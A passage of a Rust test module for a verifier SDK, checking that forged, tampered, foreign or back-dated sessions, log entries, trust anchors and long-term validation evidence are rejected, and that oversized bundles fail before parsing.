        assert_eq!(second_entry.merkle_proof[1], "leaf_index:1");
        assert_eq!(second_entry.merkle_proof[2], "tree_size:2");
        assert_eq!(
            second_entry.merkle_proof[3],
            format!("left:{}", first_entry.result_hash)
        );
    }

    #[test]
    fn seal_session_accepts_same_verifier_session() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");

        let verdict = sdk
            .seal_session(&mut session)
            .expect("same verifier session should seal");

        assert_eq!(verdict, VerificationVerdict::Inconclusive);
        assert!(session.sealed);
        assert_eq!(
            session.final_verdict,
            Some(VerificationVerdict::Inconclusive)
        );
    }

    #[test]
    fn seal_session_rejects_foreign_verifier_session() {
        let foreign_sdk = create_verifier_sdk("verifier://beta");
        let mut foreign_session = foreign_sdk
            .create_session("session-beta")
            .expect("foreign verifier session should be created");
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .seal_session(&mut foreign_session)
            .expect_err("foreign verifier session must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
        assert!(!foreign_session.sealed);
        assert!(foreign_session.final_verdict.is_none());
    }

    #[test]
    fn record_session_step_rejects_relabeled_foreign_session() {
        let foreign_sdk = create_verifier_sdk("verifier://beta");
        let mut foreign_session = foreign_sdk
            .create_session("session-beta")
            .expect("foreign verifier session should be created");
        foreign_session.verifier_identity = "verifier://alpha".to_string();
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same-verifier result should build");

        let err = sdk
            .record_session_step(&mut foreign_session, &result)
            .expect_err("relabeled foreign session must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "verifier_identity",
                ..
            }
        ));
        assert!(foreign_session.steps().is_empty());
    }

    #[test]
    fn seal_session_rejects_relabeled_foreign_session() {
        let foreign_sdk = create_verifier_sdk("verifier://beta");
        let mut foreign_session = foreign_sdk
            .create_session("session-beta")
            .expect("foreign verifier session should be created");
        foreign_session.verifier_identity = "verifier://alpha".to_string();
        let sdk = create_verifier_sdk("verifier://alpha");

        let err = sdk
            .seal_session(&mut foreign_session)
            .expect_err("relabeled foreign session must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionProvenanceMismatch {
                field: "verifier_identity",
                ..
            }
        ));
        assert!(!foreign_session.sealed);
        assert!(foreign_session.final_verdict.is_none());
    }

    #[test]
    fn seal_session_rejects_tampered_or_forged_steps() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("result should build");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("same verifier session should be created");
        sdk.record_session_step(&mut session, &result)
            .expect("valid recorded step should succeed");
        session.steps.push(SessionStep {
            step_index: 1,
            operation: VerificationOperation::Claim,
            verdict: VerificationVerdict::Pass,
            artifact_binding_hash: "artifact-hash-forged".to_string(),
            timestamp: current_utc_timestamp(),
            step_signature: "forged-step-signature".to_string(),
        });

        let err = sdk
            .seal_session(&mut session)
            .expect_err("forged step must be rejected during seal");

        assert!(matches!(
            err,
            VerifierSdkError::SessionStepSignatureMismatch { step_index: 1, .. }
        ));
        assert!(!session.sealed);
        assert!(session.final_verdict.is_none());
    }

    #[test]
    fn transparency_log_rejects_result_from_different_verifier() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let other_sdk = create_verifier_sdk("verifier://beta");
        let foreign_result = other_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "foreign verifier".to_string(),
                }],
                "artifact-hash-beta".to_string(),
            )
            .expect("foreign verifier result should be built");
        let mut log = Vec::new();

        let err = sdk
            .append_transparency_log(&mut log, &foreign_result)
            .expect_err("foreign verifier result must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(log.is_empty());
    }

    #[test]
    fn facade_emits_runtime_rfc3339_timestamps() {
        const LEGACY_PLACEHOLDER_TIMESTAMP: &str = "2026-02-21T00:00:00Z";

        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should build");
        let mut session = sdk
            .create_session("session-alpha")
            .expect("session should build with live timestamp");
        let step = sdk
            .record_session_step(&mut session, &result)
            .expect("step should record with live timestamp");
        let mut log = Vec::new();
        let entry = sdk
            .append_transparency_log(&mut log, &result)
            .expect("entry should append with live timestamp");

        for timestamp in [
            result.execution_timestamp.as_str(),
            session.created_at.as_str(),
            step.timestamp.as_str(),
            entry.timestamp.as_str(),
        ] {
            assert_ne!(timestamp, LEGACY_PLACEHOLDER_TIMESTAMP);
            chrono::DateTime::parse_from_rfc3339(timestamp)
                .expect("facade timestamps should be RFC3339");
        }
    }

    #[test]
    fn serialized_verification_result_omits_private_origin_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let serialized =
            serde_json::to_string(&result).expect("verification result serialization should work");
        let value: serde_json::Value =
            serde_json::from_str(&serialized).expect("serialized result should remain valid JSON");

        assert!(value.get("result_origin_nonce").is_none());
    }

    #[test]
    fn serialized_verification_result_round_trips_without_private_origin_nonce() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let serialized =
            serde_json::to_value(&result).expect("verification result serialization should work");
        let roundtrip: VerificationResult = serde_json::from_value(serialized)
            .expect("public JSON verification result should deserialize");

        assert_eq!(roundtrip.operation, VerificationOperation::Claim);
        assert_eq!(roundtrip.verdict, VerificationVerdict::Pass);
        assert_eq!(roundtrip.verifier_identity, "verifier://alpha");
        assert!(roundtrip.result_origin_nonce.is_empty());
    }

    #[test]
    fn confidence_score_reflects_partial_failed_assertions() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Fail,
                vec![
                    AssertionResult {
                        assertion: "capsule_replay_verified".to_string(),
                        passed: true,
                        detail: "replay matched".to_string(),
                    },
                    AssertionResult {
                        assertion: "capsule_output_hash_matches".to_string(),
                        passed: false,
                        detail: "hash diverged".to_string(),
                    },
                ],
                "artifact-hash-alpha".to_string(),
            )
            .expect("failed result should build");

        assert_eq!(result.confidence_score, 0.25);
    }

    #[test]
    fn confidence_score_preserves_midrange_inconclusive_signal() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let result = sdk
            .build_result(
                VerificationOperation::Workflow,
                VerificationVerdict::Inconclusive,
                vec![
                    AssertionResult {
                        assertion: "workflow_preconditions_met".to_string(),
                        passed: true,
                        detail: "preconditions satisfied".to_string(),
                    },
                    AssertionResult {
                        assertion: "workflow_attestation_verified".to_string(),
                        passed: false,
                        detail: "attestation unavailable".to_string(),
                    },
                ],
                "artifact-hash-alpha".to_string(),
            )
            .expect("inconclusive result should build");

        assert_eq!(result.confidence_score, 0.5);
    }

    #[test]
    fn transparency_log_rejects_same_verifier_result_from_different_sdk_instance() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let sibling_sdk = create_verifier_sdk("verifier://alpha");
        let sibling_result = sibling_sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier sibling instance".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier sibling result should be built");
        let mut log = Vec::new();

        let err = sdk
            .append_transparency_log(&mut log, &sibling_result)
            .expect_err("same-verifier result from a different sdk instance must be rejected");

        assert!(matches!(err, VerifierSdkError::ResultOriginMismatch { .. }));
        assert!(log.is_empty());
    }

    #[test]
    fn transparency_log_leaf_hash_commits_authenticated_result_origin() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut result = sdk
            .build_result(
                VerificationOperation::Claim,
                VerificationVerdict::Pass,
                vec![AssertionResult {
                    assertion: "capsule_replay_verified".to_string(),
                    passed: true,
                    detail: "same verifier".to_string(),
                }],
                "artifact-hash-alpha".to_string(),
            )
            .expect("same verifier result should be built");
        let public_json =
            serde_json::to_string(&result).expect("verification result should serialize");
        let original_hash =
            transparency_log_leaf_hash(&result).expect("original leaf hash should compute");
        result.result_origin_nonce = "alternate-origin-nonce".to_string();
        let tampered_hash =
            transparency_log_leaf_hash(&result).expect("tampered leaf hash should compute");

        assert_eq!(
            serde_json::to_string(&result).expect("tampered result should serialize"),
            public_json
        );
        assert_ne!(original_hash, tampered_hash);
    }

    #[test]
    fn verify_migration_artifact_accepts_trustless_same_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let artifact = make_migration_equivalence_bundle_bytes(
            "verifier://alpha",
            &reference_migration_equivalence_capsule(),
        );

        let result = sdk
            .verify_migration_artifact(&artifact)
            .expect("trustless same-verifier migration bundle should verify");

        assert_eq!(result.operation, VerificationOperation::MigrationArtifact);
        assert_eq!(result.verdict, VerificationVerdict::Pass);
        assert_eq!(result.verifier_identity, "verifier://alpha");
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_source_ast_reparsed" && assertion.passed
        }));
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_precondition_rechecked" && assertion.passed
        }));
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_lockstep_verdict_hash_recomputed" && assertion.passed
        }));
    }

    #[test]
    fn verify_migration_artifact_rejects_structural_only_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let artifact = make_replay_bundle_bytes("verifier://alpha");

        let result = sdk
            .verify_migration_artifact(&artifact)
            .expect("structural-only bundle should produce a signed fail result");

        assert_eq!(result.operation, VerificationOperation::MigrationArtifact);
        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_equivalence_capsule_present" && !assertion.passed
        }));
    }

    #[test]
    fn verify_migration_artifact_rejects_foreign_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let foreign_artifact = make_migration_equivalence_bundle_bytes(
            "verifier://beta",
            &reference_migration_equivalence_capsule(),
        );

        let err = sdk
            .verify_migration_artifact(&foreign_artifact)
            .expect_err("foreign-verifier bundle must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
    }

    #[test]
    fn verify_migration_artifact_rechecks_precondition() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut capsule = reference_migration_equivalence_capsule();
        capsule.precondition.source_contains = vec!["not-present-in-source".to_string()];
        let artifact = make_migration_equivalence_bundle_bytes("verifier://alpha", &capsule);

        let result = sdk
            .verify_migration_artifact(&artifact)
            .expect("precondition failure should produce a signed fail result");

        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_precondition_rechecked" && !assertion.passed
        }));
    }

    #[test]
    fn verify_migration_artifact_reparses_asts_and_rejects_drift() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut capsule = reference_migration_equivalence_capsule();
        capsule.source.source_text =
            "const value = require(\"dep\");\nmodule.exports = value.extra;\n".to_string();
        let artifact = make_migration_equivalence_bundle_bytes("verifier://alpha", &capsule);

        let result = sdk
            .verify_migration_artifact(&artifact)
            .expect("AST drift should produce a signed fail result");

        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_source_ast_reparsed" && !assertion.passed
        }));
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_source_source_hash_recomputed" && !assertion.passed
        }));
    }

    #[test]
    fn verify_migration_artifact_recomputes_lockstep_hash() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut capsule = reference_migration_equivalence_capsule();
        capsule.lockstep_witness.lockstep_verdict_hash = "bb".repeat(32);
        let artifact = make_migration_equivalence_bundle_bytes("verifier://alpha", &capsule);

        let result = sdk
            .verify_migration_artifact(&artifact)
            .expect("lockstep hash drift should produce a signed fail result");

        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "migration_lockstep_verdict_hash_recomputed" && !assertion.passed
        }));
    }

    #[test]
    fn verify_as_of_ltv_accepts_witnessed_reattested_root_anterior_to_compromise() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let evidence = reference_long_term_verification_evidence();

        let result = verify_as_of_ltv_for_test(&sdk, &evidence, "valid LTV evidence should verify");

        assert_eq!(result.operation, VerificationOperation::LongTermValidation);
        assert_eq!(result.verdict, VerificationVerdict::Pass);
        assert_eq!(result.artifact_binding_hash, evidence.artifact.marker_hash);
        assert!(result.checked_assertions.iter().any(|assertion| {
            matches!(
                assertion.assertion.as_str(),
                "ltv_witness_precedes_key_compromise_records"
            ) && assertion.passed
                && assertion.detail == LONG_TERM_VERIFICATION_PASS_DETAIL
        }));
    }

    fn builder_witness_signers(count: u8) -> Vec<LongTermWitnessSigner> {
        (0..count)
            .map(|index| LongTermWitnessSigner {
                key_id: format!("builder-witness-{index}"),
                signing_key: SigningKey::from_bytes(&[0x21 + index; 32]),
            })
            .collect()
    }

    fn builder_reference_request() -> LongTermEvidenceRequest {
        LongTermEvidenceRequest {
            artifact_id: "builder-artifact-alpha".to_string(),
            artifact_hash: bundle::hash(b"builder-artifact-bytes"),
            crypto_suite: "ed25519-v1".to_string(),
            claimed_at_unix_seconds: 1_000,
            // Two co-markers make the origin tree three leaves wide, so the
            // audit path has to walk a duplicated-odd level.
            co_marker_hashes: vec![
                bundle::hash(b"builder-chain-entry-0"),
                bundle::hash(b"builder-chain-entry-1"),
            ],
            reattestation_appended_marker_hashes: vec![bundle::hash(b"builder-appended-marker")],
            reattested_at_unix_seconds: 1_500,
            observed_at_unix_seconds: 1_700,
            as_of_unix_seconds: 1_900,
            suite_valid_from_unix_seconds: 900,
            witness_group_id: "builder-witnesses".to_string(),
            witness_policy_id: "builder-policy-v1".to_string(),
            witness_threshold: 2,
            trace_id: "trace-builder-alpha".to_string(),
            timestamp: "2026-07-11T19:00:00Z".to_string(),
        }
    }

    #[test]
    fn public_builder_produces_evidence_verify_as_of_ltv_accepts() {
        let request = builder_reference_request();
        let signers = builder_witness_signers(3);
        let evidence = build_long_term_verification_evidence(&request, &signers)
            .expect("builder should assemble self-verifying evidence");

        assert_eq!(
            evidence.schema_version,
            LONG_TERM_VERIFICATION_SCHEMA_VERSION
        );
        assert_eq!(evidence.reattestation_chain.origin_root.tree_size, 3);
        assert_eq!(
            evidence.witness_receipt.statement.root.tree_size, 4,
            "appended marker must grow the re-attested tree"
        );

        let sdk = create_verifier_sdk("verifier://builder");
        let result = verify_as_of_ltv_for_test(
            &sdk,
            &evidence,
            "builder-produced LTV evidence should verify",
        );
        assert_eq!(result.verdict, VerificationVerdict::Pass);
        assert_eq!(result.artifact_binding_hash, evidence.artifact.marker_hash);
    }

    #[test]
    fn public_builder_equal_size_reattestation_verifies() {
        let mut request = builder_reference_request();
        request.reattestation_appended_marker_hashes.clear();
        let signers = builder_witness_signers(2);
        let evidence = build_long_term_verification_evidence(&request, &signers)
            .expect("unchanged-root re-attestation should build");
        assert_eq!(
            evidence.reattestation_chain.origin_root,
            evidence.witness_receipt.statement.root
        );

        let sdk = create_verifier_sdk("verifier://builder");
        let result =
            verify_as_of_ltv_for_test(&sdk, &evidence, "equal-size re-attestation should verify");
        assert_eq!(result.verdict, VerificationVerdict::Pass);
    }

    #[test]
    fn public_builder_evidence_fails_closed_after_tamper() {
        let request = builder_reference_request();
        let signers = builder_witness_signers(3);
        let mut evidence = build_long_term_verification_evidence(&request, &signers)
            .expect("builder should assemble self-verifying evidence");
        evidence.artifact.artifact_hash = bundle::hash(b"tampered-artifact-bytes");

        let sdk = create_verifier_sdk("verifier://builder");
        let result = sdk
            .verify_as_of_ltv(&evidence)
            .expect("tampered evidence still yields a signed fail result");
        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            assertion.assertion == "ltv_artifact_marker_recomputed" && !assertion.passed
        }));
    }

    #[test]
    fn public_builder_rejects_invalid_producer_inputs() {
        let request = builder_reference_request();
        assert!(
            build_long_term_verification_evidence(&request, &[])
                .expect_err("no signers must be rejected")
                .contains("witness signer")
        );

        let mut over_threshold = builder_reference_request();
        over_threshold.witness_threshold = 4;
        assert!(
            build_long_term_verification_evidence(&over_threshold, &builder_witness_signers(3))
                .expect_err("threshold above signer count must be rejected")
                .contains("witness_threshold")
        );

        let mut bad_marker = builder_reference_request();
        bad_marker.co_marker_hashes = vec!["not-a-digest".to_string()];
        assert!(
            build_long_term_verification_evidence(&bad_marker, &builder_witness_signers(2))
                .expect_err("non-canonical marker must be rejected")
                .contains("canonical lowercase sha256")
        );

        let mut anachronistic = builder_reference_request();
        anachronistic.observed_at_unix_seconds = anachronistic.as_of_unix_seconds + 1;
        assert!(
            build_long_term_verification_evidence(&anachronistic, &builder_witness_signers(2))
                .expect_err("witness after as-of must fail the self-check")
                .contains("ltv_witness_anterior_to_as_of")
        );
    }

    #[test]
    fn verify_as_of_ltv_emits_stable_success_transcript() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let evidence = reference_long_term_verification_evidence();

        let result = verify_as_of_ltv_for_test(&sdk, &evidence, "valid LTV evidence should verify");
        let events = long_term_verification_audit_events(&result);
        let transcript = events
            .iter()
            .map(|event| json!({"event_code": event.event_code, "detail": event.detail}))
            .collect::<Vec<_>>();

        assert_eq!(
            transcript,
            vec![
                json!({
                    "event_code": FN_LTV_VERIFY_AS_OF_COMPLETED,
                    "detail": "verdict=Pass; confidence_score=1.00"
                }),
                json!({
                    "event_code": FN_LTV_WITNESS_ANTERIORITY_PROVEN,
                    "detail": LONG_TERM_VERIFICATION_PASS_DETAIL
                })
            ]
        );
    }

    #[test]
    fn verify_as_of_ltv_hybrid_suite_survives_constituent_algorithm_death() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut evidence =
            reference_long_term_verification_evidence_for_suite("ed25519-pq-hybrid-v1");
        evidence.suite_records.push(LongTermCryptoSuiteRecord {
            crypto_suite: "ed25519-v1".to_string(),
            valid_from_unix_seconds: 1,
            valid_until_unix_seconds: Some(1_200),
            compromised_at_unix_seconds: Some(1_600),
        });

        let result =
            verify_as_of_ltv_for_test(&sdk, &evidence, "hybrid LTV evidence should verify");
        let events = long_term_verification_audit_events(&result);

        assert_eq!(result.verdict, VerificationVerdict::Pass);
        assert!(events.iter().any(|event| {
            event.event_code == FN_LTV_HYBRID_SURVIVED_ALGO_DEATH
                && event.detail.contains("hybrid crypto suite remained valid")
        }));
        assert!(events.iter().any(|event| {
            event.event_code == FN_LTV_WITNESS_ANTERIORITY_PROVEN
                && event.detail == LONG_TERM_VERIFICATION_PASS_DETAIL
        }));
    }

    #[test]
    fn verify_as_of_ltv_round_trips_receipt_flow_and_rejects_backdated_forgery_transcript() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let evidence = reference_long_term_verification_evidence();
        let serialized_result = serde_json::to_vec(&evidence);
        assert!(
            serialized_result.is_ok(),
            "LTV evidence should serialize as JSON: {serialized_result:?}"
        );
        let serialized = serialized_result.unwrap_or_default();
        let restored_result: serde_json::Result<LongTermVerificationEvidence> =
            serde_json::from_slice(&serialized);
        assert!(
            restored_result.is_ok(),
            "LTV evidence should deserialize from JSON: {restored_result:?}"
        );
        let mut restored =
            restored_result.unwrap_or_else(|_| reference_long_term_verification_evidence());

        assert_eq!(restored.witness_receipt.threshold_config.threshold, 2);
        assert_eq!(
            restored.witness_receipt.witness_artifact.signatures.len(),
            2
        );

        let accepted = verify_as_of_ltv_for_test(
            &sdk,
            &restored,
            "round-tripped LTV receipt flow should verify",
        );
        let accepted_transcript = long_term_verification_audit_events(&accepted)
            .iter()
            .map(|event| json!({"event_code": event.event_code, "detail": event.detail}))
            .collect::<Vec<_>>();

        assert_eq!(accepted.verdict, VerificationVerdict::Pass);
        assert_eq!(
            accepted_transcript,
            vec![
                json!({
                    "event_code": FN_LTV_VERIFY_AS_OF_COMPLETED,
                    "detail": "verdict=Pass; confidence_score=1.00"
                }),
                json!({
                    "event_code": FN_LTV_WITNESS_ANTERIORITY_PROVEN,
                    "detail": LONG_TERM_VERIFICATION_PASS_DETAIL
                })
            ]
        );

        restored.suite_records[0].compromised_at_unix_seconds = Some(
            restored
                .witness_receipt
                .statement
                .observed_at_unix_seconds
                .saturating_sub(1),
        );
        let rejected = verify_as_of_ltv_for_test(
            &sdk,
            &restored,
            "post-compromise back-dated evidence should produce a signed fail result",
        );
        let rejected_transcript = long_term_verification_audit_events(&rejected);

        assert_eq!(rejected.verdict, VerificationVerdict::Fail);
        assert!(
            rejected_transcript
                .iter()
                .any(|event| event.event_code == FN_LTV_BACKDATING_REJECTED)
        );
    }

    #[test]
    fn verify_as_of_ltv_rejects_root_witness_observed_after_as_of() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut evidence = reference_long_term_verification_evidence();
        evidence.as_of_unix_seconds = evidence
            .witness_receipt
            .statement
            .observed_at_unix_seconds
            .saturating_sub(1);

        let result =
            verify_as_of_ltv_for_test(&sdk, &evidence, "late witness should produce fail result");

        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            matches!(
                assertion.assertion.as_str(),
                "ltv_witness_anterior_to_as_of"
            ) && !assertion.passed
        }));
        assert!(
            long_term_verification_audit_events(&result)
                .iter()
                .any(|event| event.event_code == FN_LTV_BACKDATING_REJECTED)
        );
    }

    #[test]
    fn verify_as_of_ltv_rejects_witness_after_recorded_key_compromise() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let mut evidence = reference_long_term_verification_evidence();
        evidence.suite_records[0].compromised_at_unix_seconds =
            Some(evidence.witness_receipt.statement.observed_at_unix_seconds);

        let result = verify_as_of_ltv_for_test(
            &sdk,
            &evidence,
            "post-compromise witness should produce fail result",
        );

        assert_eq!(result.verdict, VerificationVerdict::Fail);
        assert!(result.checked_assertions.iter().any(|assertion| {
            matches!(
                assertion.assertion.as_str(),
                "ltv_witness_precedes_key_compromise_records"
            ) && !assertion.passed
        }));
        assert!(
            long_term_verification_audit_events(&result)
                .iter()
                .any(|event| event.event_code == FN_LTV_BACKDATING_REJECTED)
        );
    }

    #[test]
    fn verify_trust_state_accepts_structural_same_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");

        let result = sdk
            .verify_trust_state(&state, &verified.integrity_hash)
            .expect("structural same-verifier trust-state bundle should verify");

        assert_eq!(result.operation, VerificationOperation::TrustState);
        assert_eq!(result.verdict, VerificationVerdict::Pass);
        assert_eq!(result.verifier_identity, "verifier://alpha");
    }

    #[test]
    fn verify_trust_state_rejects_foreign_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let foreign_state = make_replay_bundle_bytes("verifier://beta");
        let verified = bundle::verify(&foreign_state).expect("test bundle should verify");

        let err = sdk
            .verify_trust_state(&foreign_state, &verified.integrity_hash)
            .expect_err("foreign-verifier trust-state bundle must be rejected");

        assert!(matches!(
            err,
            VerifierSdkError::SessionVerifierMismatch { .. }
        ));
    }

    #[test]
    fn verify_trust_state_rejects_uppercase_anchor_hash() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");

        let err = sdk
            .verify_trust_state(&state, &verified.integrity_hash.to_uppercase())
            .expect_err("uppercase trust anchor hash must be rejected");

        assert_eq!(
            err,
            VerifierSdkError::MalformedTrustAnchor {
                actual: verified.integrity_hash.to_uppercase(),
            }
        );
    }

    #[test]
    fn verify_trust_state_rejects_whitespace_padded_anchor_hash() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");
        let padded_hash = format!(" {} ", verified.integrity_hash);

        let err = sdk
            .verify_trust_state(&state, &padded_hash)
            .expect_err("whitespace-padded trust anchor hash must be rejected");

        assert_eq!(
            err,
            VerifierSdkError::MalformedTrustAnchor {
                actual: padded_hash,
            }
        );
    }

    #[test]
    fn verify_trust_state_rejects_mismatched_anchor_before_structural_guardrail() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let state = make_replay_bundle_bytes("verifier://alpha");
        let verified = bundle::verify(&state).expect("test bundle should verify");
        let wrong_anchor = "0".repeat(64);

        let err = sdk
            .verify_trust_state(&state, &wrong_anchor)
            .expect_err("mismatched trust anchor must fail before structural bundle handling");

        assert_eq!(
            err,
            VerifierSdkError::TrustAnchorMismatch {
                expected: wrong_anchor,
                actual: verified.integrity_hash,
            }
        );
    }

    #[test]
    fn verifier_sdk_display_redacts_sensitive_mismatch_payloads() {
        let trust_anchor_error = VerifierSdkError::TrustAnchorMismatch {
            expected: "expected-anchor".to_string(),
            actual: "actual-anchor".to_string(),
        };
        let verifier_identity_error = VerifierSdkError::InvalidVerifierIdentity {
            actual: "verifier://attacker\nspoof".to_string(),
            reason: "identity must use the external verifier:// scheme".to_string(),
        };
        let session_signature_error = VerifierSdkError::SessionStepSignatureMismatch {
            step_index: 2,
            actual: "actual-step-signature".to_string(),
        };
        let result_signature_error = VerifierSdkError::ResultSignatureMismatch {
            expected: "expected-result-signature".to_string(),
            actual: "actual-result-signature".to_string(),
        };

        let trust_anchor_display = trust_anchor_error.to_string();
        assert!(trust_anchor_display.contains("redacted"));
        assert!(!trust_anchor_display.contains("expected-anchor"));
        assert!(!trust_anchor_display.contains("actual-anchor"));

        let verifier_identity_display = verifier_identity_error.to_string();
        assert!(
            verifier_identity_display.contains("identity must use the external verifier:// scheme")
        );
        assert!(!verifier_identity_display.contains("verifier://attacker"));
        assert!(!verifier_identity_display.contains("spoof"));

        let session_signature_display = session_signature_error.to_string();
        assert!(session_signature_display.contains("signatures redacted"));
        assert!(!session_signature_display.contains("expected-step-signature"));
        assert!(!session_signature_display.contains("actual-step-signature"));

        let result_signature_display = result_signature_error.to_string();
        assert!(result_signature_display.contains("signatures redacted"));
        assert!(!result_signature_display.contains("expected-result-signature"));
        assert!(!result_signature_display.contains("actual-result-signature"));
    }

    #[test]
    fn validate_bundle_accepts_same_verifier_bundle() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let bundle = make_replay_bundle_bytes("verifier://alpha");

        sdk.validate_bundle(&bundle)
            .expect("same-verifier bundle should validate");
    }

    #[test]
    fn validate_bundle_rejects_oversized_bundle_with_default_cap() {
        let sdk = create_verifier_sdk("verifier://alpha");
        let oversized = vec![0u8; DEFAULT_MAX_BUNDLE_SIZE_BYTES + 1];

        let err = sdk
            .validate_bundle(&oversized)
            .expect_err("bundles larger than DEFAULT_MAX_BUNDLE_SIZE_BYTES must fail closed");

        match err {
            VerifierSdkError::BundleTooLarge {
                actual_bytes,
                max_bytes,
            } => {
                assert_eq!(actual_bytes, DEFAULT_MAX_BUNDLE_SIZE_BYTES + 1);
                assert_eq!(max_bytes, DEFAULT_MAX_BUNDLE_SIZE_BYTES);
            }
            other => panic!("expected BundleTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_size_cap_runs_before_parser() {
        // Confirms the cap short-circuits the parser pipeline: garbage bytes that
        // would otherwise error inside bundle::verify must surface BundleTooLarge
        // first when they exceed the cap. This is the DoS-prevention property —
        // attacker-controlled bytes never reach the expensive parsing path.
        let sdk = create_verifier_sdk("verifier://alpha");
        let oversized_garbage = vec![0xffu8; DEFAULT_MAX_BUNDLE_SIZE_BYTES + 4096];

        let err = sdk
            .validate_bundle(&oversized_garbage)
            .expect_err("oversized garbage must be rejected by the cap before parsing");

        assert!(
            matches!(err, VerifierSdkError::BundleTooLarge { .. }),
            "expected BundleTooLarge before any parser error, got {err:?}"
        );
    }

    #[test]
    fn validate_bundle_honors_lowered_config_override() {
        let mut sdk = create_verifier_sdk("verifier://alpha");
        let bundle = make_replay_bundle_bytes("verifier://alpha");
        // Tighten the cap to one byte below the legitimate bundle's size.
        let tight_cap = bundle.len().saturating_sub(1);
        sdk.config.insert(
            VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY.to_string(),
            tight_cap.to_string(),
        );

        let err = sdk
            .validate_bundle(&bundle)
            .expect_err("bundle larger than configured cap must be rejected");

        match err {
